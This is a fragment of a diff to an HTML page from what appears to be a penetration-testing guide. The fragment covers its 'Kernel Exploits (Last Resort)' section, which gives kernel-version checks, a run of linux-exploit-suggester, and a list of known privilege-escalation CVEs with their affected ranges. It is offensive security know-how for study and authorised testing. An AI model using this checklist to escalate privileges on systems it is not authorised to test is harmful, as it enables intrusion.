-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c1"># 2. Automated suggestions — THE TOOL, but READ the output and prune false positives</span>
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>./linux-exploit-suggester.sh<span class="w"> </span>-k<span class="w"> </span><span class="k">$(</span>uname<span class="w"> </span>-r<span class="k">)</span>
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>./les.sh
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># 3. Common historical LPEs (verify the target actually matches!)</span>
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>uname<span class="w"> </span>-r<span class="w"> </span><span class="c1"># DirtyCow (2.6.22 - 4.8.3) CVE-2016-5195</span>
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">                  </span><span class="c1"># DirtyPipe (5.8 - 5.16.11) CVE-2022-0847</span>
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">                  </span><span class="c1"># PwnKit (pkexec, all versions) CVE-2021-4034</span>
-</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="w">                  </span><span class="c1"># Sudo Baron Samedit CVE-2021-3156</span>
-</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="w">                  </span><span class="c1"># Netfilter nf_tables (5.14-6.6) CVE-2024-1086</span>
-</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="w">                  </span><span class="c1"># OverlayFS (Ubuntu 20.04/22.04) CVE-2023-0386</span>
-</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="w">                  </span><span class="c1"># io_uring (5.10-6.6) CVE-2023-0461</span>
-</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="c1"># 4. Always test on a snapshot / low-value host first. Kernel exploits = crashes.</span>
+<h2 id="8-kernel-exploits-last-resort">8. Kernel Exploits (Last Resort)<a class="headerlink" href="#8-kernel-exploits-last-resort" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># 1. Identify the exact kernel version</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>uname<span class="w"> </span>-r<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/version
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="c1"># 2. Automated suggestions — THE TOOL, but READ the output and prune false positives</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>./linux-exploit-suggester.sh<span class="w"> </span>-k<span class="w"> </span><span class="k">$(</span>uname<span class="w"> </span>-r<span class="k">)</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>./les.sh
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="c1"># 3. Common historical LPEs (verify the target actually matches!)</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>uname<span class="w"> </span>-r<span class="w"> </span><span class="c1"># DirtyCow (2.6.22 - 4.8.3) CVE-2016-5195</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">                  </span><span class="c1"># DirtyPipe (5.8 - 5.16.11) CVE-2022-0847</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">                  </span><span class="c1"># PwnKit (pkexec, all versions) CVE-2021-4034</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">                  </span><span class="c1"># Sudo Baron Samedit CVE-2021-3156</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w">                  </span><span class="c1"># Netfilter nf_tables (5.14-6.6) CVE-2024-1086</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="w">                  </span><span class="c1"># OverlayFS (Ubuntu 20.04/22.04) CVE-2023-0386</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="w">                  </span><span class="c1"># io_uring (5.10-6.6) CVE-2023-0461</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="c1"># 4. Always test on a snapshot / low-value host first. Kernel exploits = crashes.</span>
 </span></code></pre></div>
 <div class="admonition tip">
 <p class="admonition-title">Order of Preference (Highest Reliability First)</p>
